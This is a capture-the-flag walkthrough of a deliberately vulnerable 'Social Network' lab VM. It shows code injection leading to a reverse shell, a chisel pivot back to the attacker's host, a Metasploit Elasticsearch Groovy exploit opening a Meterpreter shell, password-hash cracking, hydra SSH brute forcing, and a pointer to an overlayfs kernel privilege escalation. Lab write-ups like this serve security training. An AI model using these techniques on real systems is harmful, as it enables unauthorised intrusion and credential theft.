# BoredHackerBlog: Social Network Walkthrough
# DEscription
```bash
Leave a message is a new anonymous social networking site where users can post messages for each other. They've assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.

Difficulty: Med

Tasks involved:

port scanning
webapp attacks
code injection
pivoting
exploitation
password cracking
brute forcing
Virtual Machine:

Format: Virtual Machine (Virtualbox OVA)
Operating System: Linux
Networking:

DHCP Service: Enabled
IP Address Automatically assign
This works better with VirtualBox rather than VMware.
```

# Exploitation
Let's start with network scan
```bash
 Currently scanning: 192.168.0.1/24   |   Screen View: Unique Hosts                                                                                                                                               
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.100   58:11:22:85:0d:41      2     120  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.107   08:00:27:41:ad:be      1      60  PCS Systemtechnik GmbH
```
\
Next, finding open ports on target machine
```bash
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)
```
\
Opening port 5000 with burpsuite
\
<img width="897" height="535" alt="image" src="https://github.com/user-attachments/assets/aadd0223-c1f4-4c8e-9cf1-4d00e5d31fd1" />
\
It was just random stuff , i tried command injection but didnt work , so i was checking for directories and found
\
<img width="462" height="42" alt="image" src="https://github.com/user-attachments/assets/51c57cd8-ee42-45a3-b213-61fe89be05c9" />
\
It said input code to exec , so i did and got a reverse shell
\
<img width="496" height="425" alt="image" src="https://github.com/user-attachments/assets/019959df-2186-453f-a25d-f0feeba58029" />
\
penelope listener was on 
```bash
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:03  
          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:203648 errors:0 dropped:0 overruns:0 frame:0
          TX packets:195781 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:18897524 (18.0 MiB)  TX bytes:133961496 (127.7 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```
\
Then i install static binary of nmap from "https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap" and run a network scan, where we find port 9200 open on the ip
172.17.0.2
```bash
Nmap scan report for 172.17.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000081s latency).
Not shown: 1288 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:03:F9:C0:D3 (Unknown)

Nmap scan report for 172.17.0.2
Host is up (0.000092s latency).
Not shown: 1288 closed ports
PORT     STATE SERVICE
9200/tcp open  wap-wsp
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
\
So i create a port forwarding to access from the attacker machine
Steps for port forwarding using chisel are
```bash
Server side
./chisel_1.11.3_linux_amd64 server -p 9001 --reverse
Target machine side
./chisel_1.11.3_linux_amd64 client 192.168.0.124:9001 R:9999:172.17.0.2:9200
```
\
Then i test with curl 
```bash
curl 'http://127.0.0.1:9999'
{
  "status" : 200,
  "name" : "Arizona Annie",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp" : "2014-12-16T14:11:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.2"
  },
  "tagline" : "You Know, for Search"
}

```
\
The service running is Elastic search , so i check metasploit if it has any modules for it
```bash
msf > search elastic 1.4.

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/multi/elasticsearch/search_groovy_script  2015-02-11       excellent  Yes    ElasticSearch Search Groovy Sandbox Bypass


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/elasticsearch/search_groovy_script
msf exploit(multi/elasticsearch/search_groovy_script) > run
[-] Handler failed to bind to 192.168.0.124:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf exploit(multi/elasticsearch/search_groovy_script) > set lport 4445
lport => 4445
msf exploit(multi/elasticsearch/search_groovy_script) > run
[*] Started reverse TCP handler on 192.168.0.124:4445 
[*] Checking vulnerability...
[*] Discovering TEMP path...
[+] TEMP path on '/tmp'
[*] Discovering remote OS...
[+] Remote OS is 'Linux'
[*] Trying to load metasploit payload...
[*] Sending stage (58073 bytes) to 192.168.0.107
[+] Deleted /tmp/Cokb.jar
[*] Meterpreter session 1 opened (192.168.0.124:4445 -> 192.168.0.107:56712) at 2026-04-23 07:22:26 -0400

meterpreter > shell
Process 1 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)
which python
ifconfig
/bin/sh: 3: ifconfig: not found
netstat -tuln
/bin/sh: 4: netstat: not found
which python3
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      8de22d095e37
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  20044  1500 pts/0    Ss+  08:53   0:00 /bin/bash /main.sh default
root        13  0.3 25.3 2012592 258264 pts/0  Sl+  08:53   0:31 /usr/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Delasticsearch -Des.path.home=/elasticsearch -cp :/elasticsearch/lib/elasticsearch-1.4.2.jar:/elasticsearch/lib/*:/elasticsearch/lib/sigar/* org.elasticsearch.bootstrap.Elasticsearch
root        53  0.0  0.0   4268   352 pts/0    S+   08:54   0:00 tail -f ./elasticsearch/logs/elasticsearch.log
root        75  1.8  8.1 1398356 82540 pts/0   Sl+  11:22   0:00 /usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java -classpath /tmp/~spawn9031120219741005385.tmp.dir metasploit.Payload
root        86  0.0  0.0   4332   640 pts/0    S+   11:22   0:00 sh -c /bin/sh
root        88  0.0  0.0   4332   652 pts/0    S+   11:22   0:00 /bin/sh
root        96  0.0  0.1  17500  1156 pts/0    R+   11:23   0:00 ps aux
ls -la
total 27172
drwxr-xr-x 37 root root     4096 Apr 23 08:53 .
drwxr-xr-x 37 root root     4096 Apr 23 08:53 ..
-rwxr-xr-x  1 root root        0 Apr 23 08:53 .dockerenv
drwxr-xr-x  2 root root     4096 Oct 11  2018 bin
drwxr-xr-x  2 root root     4096 Jun 14  2018 boot
drwxr-xr-x  5 root root      360 Apr 23 08:53 dev
drwxr-xr-x  7 root root     4096 Apr 23 08:53 elasticsearch
-rw-r--r--  1 root root 27734207 May 16  2018 elasticsearch-1.4.2.tar.gz
drwxr-xr-x 69 root root     4096 Apr 23 08:53 etc
drwxr-xr-x  2 root root     4096 Jun 14  2018 home
drwxr-xr-x 12 root root     4096 Oct 29  2018 lib
drwxr-xr-x  2 root root     4096 Oct 11  2018 lib64
-rwxrwxr-x  1 root root      262 Oct 29  2018 main.sh
drwxr-xr-x  2 root root     4096 Oct 11  2018 media
drwxr-xr-x  2 root root     4096 Oct 11  2018 mnt
drwxr-xr-x  2 root root     4096 Oct 11  2018 opt
-rw-rw-r--  1 root root      287 Oct 29  2018 passwords
dr-xr-xr-x 94 root root        0 Apr 23 08:53 proc
drwx------  2 root root     4096 Oct 11  2018 root
drwxr-xr-x  4 root root     4096 Oct 29  2018 run
drwxr-xr-x  2 root root     4096 Oct 29  2018 sbin
drwxr-xr-x  2 root root     4096 Oct 11  2018 srv
dr-xr-xr-x 13 root root        0 Apr 23 08:53 sys
drwxrwxrwt  4 root root     4096 Apr 23 11:22 tmp
drwxr-xr-x 16 root root     4096 Oct 29  2018 usr
drwxr-xr-x 14 root root     4096 Oct 29  2018 var
cat main*
#!/bin/bash

# Start elasticsearch
./elasticsearch/bin/elasticsearch -d

# take a break
sleep 10

# Add sample data
curl -XPUT 'http://127.0.0.1:9200/blog/user/dilbert' \
        -d '{"name" : "Dilbert Brown"}'

# get log
tail -f ./elasticsearch/logs/elasticsearch.log

```
\
So we got a reverse shell on this internal system , now lets check the elastic search data
\
<img width="457" height="396" alt="image" src="https://github.com/user-attachments/assets/10c7f0c5-0b13-4918-8753-db52034a1761" />
\
And i realized that there was a unique file passwords in the "/" directory
```bash
cat pas*
Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase
Example: 1234abcd
john:3f8184a7343664553fcb5337a3138814 
test:861f194e9d6118f3d942a72be3e51749
admin:670c3bbc209a18dde5446e5e6c1f1d5b
root:b3d34352fc26117979deabdf1b9b6354
jane:5c158b60ed97c723b673529b8a3cf72b
```
\
So lets try to crack these from "https://crackstation.net"
```bash
1337hack
1234test
1111pass
1234pass
1234jane

john
test
admin
root
jane
```
\
Now im going to bruteforce ssh using hydra
```bash
hydra -L names -P pass -t20 ssh://192.168.0.107 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-23 08:45:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.0.107:22/
[22][ssh] host: 192.168.0.107   login: john   password: 1337hack
1 of 1 target successfully completed, 1 valid password found
```
\
Found the combo and logged in and found another user "socnet"
```bash
john@socnet:~$ cd /home
john@socnet:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Oct 27  2018 .
drwxr-xr-x 22 root   root   4096 Oct 27  2018 ..
drwxr-xr-x  3 john   john   4096 Oct 28  2018 john
drwxr-xr-x  3 socnet socnet 4096 Oct 28  2018 socnet
john@socnet:/home$ cd socnet/
john@socnet:/home/socnet$ ls -la
total 32
drwxr-xr-x 3 socnet socnet 4096 Oct 28  2018 .
drwxr-xr-x 4 root   root   4096 Oct 27  2018 ..
-rw------- 1 socnet socnet    5 Oct 28  2018 .bash_history
-rw-r--r-- 1 socnet socnet  220 Oct 27  2018 .bash_logout
-rw-r--r-- 1 socnet socnet 3637 Oct 27  2018 .bashrc
drwx------ 2 socnet socnet 4096 Oct 27  2018 .cache
-rw-r--r-- 1 socnet socnet  675 Oct 27  2018 .profile
-rw-rw-r-- 1 socnet socnet   66 Oct 28  2018 .selected_editor
```
\
```bash
john@socnet:/tmp$ uname -a
Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
\

After this we have to use the "Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation" method to get root access
